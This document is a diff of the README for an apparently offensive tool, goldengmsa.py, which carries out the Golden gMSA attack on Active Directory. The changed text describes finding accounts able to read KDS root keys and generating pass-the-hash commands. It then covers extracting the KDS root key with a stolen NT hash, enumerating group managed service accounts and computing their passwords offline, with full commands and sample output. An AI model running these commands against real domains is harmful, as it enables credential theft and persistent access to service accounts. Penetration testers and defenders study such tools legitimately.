@@ -56,31 +56,59 @@ uv run goldengmsa.py readers \
 
 `readers` prints direct ACL trustees and expands their actual user and computer
 members beneath them by default. It also prints candidate pass-the-hash
-commands for accounts that may read each KDS root key. Use
+commands for accounts that may read each KDS root key. The generated commands
+put `-hashes ':<NTHASH>'` at the end so the placeholder is easy to replace. Use
 `--no-expand-groups` only when you want to inspect the direct trustees without
 group expansion.
 
-Use the hash of one of the listed KDS reader accounts to retrieve the key. Pass
-the SID and password ID printed by `gmsainfo` so the next command contains
-everything needed for offline computation:
+Use the hash of one of the listed KDS reader accounts to retrieve the key:
 
 ```bash
 uv run goldengmsa.py kdsinfo \
-  'corp.local/Administrator@dc01.corp.local' -hashes ':READER_NT_HASH' \
+  'corp.local/Administrator@dc01.corp.local' \
   --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb \
-  --sid S-1-5-21-1437000690-1664695696-1586295871-1112 \
-  --pwdid '<BASE64_MANAGED_PASSWORD_ID>' \
+  --domain corp.local \
+  --show-secrets \
+  -hashes ':READER_NT_HASH'
+```
+
+When `--sid` and `--pwdid` are omitted, `kdsinfo` enumerates gMSAs in
+`--domain` (the authentication domain by default), reads each
+`msDS-ManagedPasswordId`, and matches its embedded root-key GUID. It prints all
+the information required by `compute` without requiring a separate
+`gmsainfo` command:
+
+```text
+Root key GUID (reference): 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb
+KDS key for compute (--kdskey): <EXTRACTED_BASE64_KDS_KEY>
+
+Matching gMSA: svc_sql$
+gMSA SID for compute (--sid): S-1-5-21-...-1112
+Managed password ID for compute (--pwdid): <EXTRACTED_BASE64_MANAGED_PASSWORD_ID>
+
+Offline compute command:
+./goldengmsa.py compute \
+  --sid S-1-5-21-...-1112 \
+  --kdskey <EXTRACTED_BASE64_KDS_KEY> \
+  --pwdid <EXTRACTED_BASE64_MANAGED_PASSWORD_ID> \
   --show-secrets
 ```
 
-The `kdsinfo` output prints a complete command containing the extracted
-`--kdskey`, `--sid`, and `--pwdid` values:
+The root-key GUID is reference/query metadata for `kdsinfo`; it is not a
+`compute` option. `--kdskey`, `--sid`, and `--pwdid` are labeled explicitly as
+the inputs accepted by `compute`. If the gMSA resides in another child domain,
+repeat the query with `--domain <gmsa-domain>`. `--forest` controls the KDS
+configuration-partition query and does not select the gMSA domain.
+
+Explicit `--sid` plus `--pwdid` remain available for previously captured data
+and bypass automatic gMSA discovery. The generated command can be executed
+entirely offline:
 
 ```bash
 uv run goldengmsa.py compute \
   --sid S-1-5-21-1437000690-1664695696-1586295871-1112 \
   --kdskey '<EXTRACTED_BASE64_KDS_KEY>' \
-  --pwdid '<BASE64_MANAGED_PASSWORD_ID>' \
+  --pwdid '<EXTRACTED_BASE64_MANAGED_PASSWORD_ID>' \
   --show-secrets
 ```
 
